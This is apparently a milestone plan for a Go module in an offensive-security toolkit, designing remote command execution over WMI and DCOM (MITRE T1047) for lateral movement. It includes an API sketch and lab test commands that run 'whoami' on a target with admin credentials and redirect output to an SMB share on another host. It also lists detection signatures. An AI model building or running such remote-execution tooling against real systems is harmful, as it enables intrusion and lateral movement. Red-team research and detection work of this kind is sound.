---
milestone: M11
package: lateral/wmiexec
mitre: T1047
status: planning
opened: 2026-05-20
parent_roadmap: .dev/wraith-2026/roadmap.md
last_reviewed: 2026-05-20
reflects_commit: HEAD
---

# M11 — WMI Remote Execution (T1047)

## Goal

Primitive d'étude pour invocation distante d'une méthode `Win32_Process::Create` via DCOM activator (`IRemoteSCMActivator`) puis `IWbemServices::ExecMethod`. Output recovery via WMI temporary event subscription OR via stdout-redirect to an SMB share file (two strategies documented; one chosen per use). Research framing: MITRE T1047 (Windows Management Instrumentation).

## Package layout

```
lateral/wmiexec/
  doc.go                    # T1047 technique documentation
  executor.go               # Executor struct, Exec() entry point, OutputStrategy enum
  activator.go              # IRemoteSCMActivator DCOM handshake, NDR marshal
  wbem_services.go          # IWbemServices::ExecMethod dispatch, parameter encoding
  output_event.go           # WMI event subscription capture strategy
  output_smbfile.go         # SMB file redirect strategy (uses M2 stack)
  result.go                 # Result struct with Stdout, Stderr, ExitCode, PID, RawEvents
  executor_windows.go       # Windows implementation
  executor_linux.go         # Stub (no WMI on Linux)
  _test.go                  # Unit tests: NDR encoding, IWbemServices UUID resolution
```

## Public API

```go
package wmiexec

// OutputStrategy defines output capture method.
type OutputStrategy int

const (
	OutputViaEventSubscription OutputStrategy = iota
	OutputViaSMBFile
)

// Executor manages remote WMI invocations.
type Executor struct {
	OutputStrategy OutputStrategy
}

// Result holds execution output and metadata.
type Result struct {
	Stdout       string
	Stderr       string
	ExitCode     uint32
	PID          uint32
	RawEvents    []string // raw WMI event XML if strategy is EventSubscription
	ExecutedAt   time.Time
}

// Exec invokes Win32_Process::Create on a remote hôte d'étude.
func (e *Executor) Exec(ctx context.Context, host, username, password, cmd string) (*Result, error)
```

## Implementation steps

| Step | Commit Subject | Success Criterion |
|------|--------|-------------------|
| 1 | `chore(go.mod): pin oiweiwei/go-msrpc + go-ole/go-ole for M11` | go.mod entries present, builds cleanly |
| 2 | `feat(lateral/wmiexec): M11.a — DCOM activator + IRemoteSCMActivator handshake [T1047]` | DCOM UUID resolution, NDR marshal of MethodInvoke params, IRemoteSCMActivator interface handshake, unit tests pass |
| 3 | `feat(lateral/wmiexec): M11.b — IWbemServices::ExecMethod dispatch + output capture [T1047]` | Both output strategies wired, event subscription test capture or SMB file read, Result struct populated, E2E test verifies PID + event 4688 |
| 4 | `docs(lateral/wmiexec): M11 tech md + tracker ✅ [T1047]` | tech-md Examples block shows both OutputStrategy usages, Limitations block updated, .dev/wraith-2026/roadmap.md milestone checked ✅ |

## Test plan

### Unit
- NDR encoding of `MethodInvoke` parameters (DCOM marshaling).
- IWbemServices interface UUID resolution via go-ole.
- OutputStrategy enum dispatch logic.
- Event XML parsing (malformed event edge cases).

### VM E2E
- **Setup:** Windows10 workgroup, local admin credentials.
- **Scenario 1 (event subscription):** `Exec(ctx, "192.168.56.101", "Admin", "password", "cmd.exe /c whoami")`; verify `Result.Stdout` contains admin username; verify event 4688 in Event Viewer with parent `wmiprvse.exe`.
- **Scenario 2 (SMB file redirect):** `Exec(ctx, "192.168.56.101", "Admin", "password", "cmd.exe /c whoami > \\\\192.168.56.1\\share\\out.txt")`; verify file created on host, `Result.Stdout` empty (pending M2 SMB callback), event 4688 present.
- Run from: host (native Win32) or Kali SSH (go-msrpc over TCP).

## Detection signatures

| Detector | Signature | Event ID / Sigma |
|----------|-----------|------------------|
| Windows Event Log | Process creation with parent `wmiprvse.exe` | Event 4688 |
| Sigma | WMI spawning suspicious processes | `proc_creation_win_wmiprvse_spawning_process.yml` |
| MDE | Suspicious WMI activity family | MDE behavior classification |
| Sysmon | Parent/child process relations involving WMI | Event 1 (process create) parent chain |

## Limitations

- **Caller matrix deferred:** TCP/DCERPC only; no `wsyscall.Caller` optional parameter (no kernel-mode bypass for WMI gateway).
- **Kerberos auth deferred:** NTLMv2 credential passing only at M11; Kerberos ticket injection deferred to M13.
- **Event subscription requires elevation:** Temporary event consumer creation on hôte d'étude requires elevated rights; document as prerequisite.
- **SMB file output depends on M2 stack:** OutputViaSMBFile strategy requires lateral/smb2 (M2) to be completed; document fallback to OutputViaEventSubscription.

## Dependencies

- `oiweiwei/go-msrpc` for DCERPC marshaling and RPC call dispatch.
- `go-ole/go-ole` for DCOM interface resolution and IDispatch binding.
- `lateral/smb2` (M2) if using OutputViaSMBFile strategy.
- `internal/log` for structured logging.

## Closure gate

- [ ] Exec() signature matches API sketch; Result struct complete.
- [ ] Both output strategies implemented and unit-tested.
- [ ] VM E2E: event 4688 with parent `wmiprvse.exe` verified on Windows10.
- [ ] Event XML parser handles malformed input gracefully.
- [ ] Tech md written with Examples + Limitations blocks; MITRE T1047 + detection anchors documented.
- [ ] All tests (unit + VM E2E) passing; coverage >80% for `executor.go` + `wbem_services.go`.
- [ ] Roadmap.md M11 gate ✅ marked; no regressions in other packages.
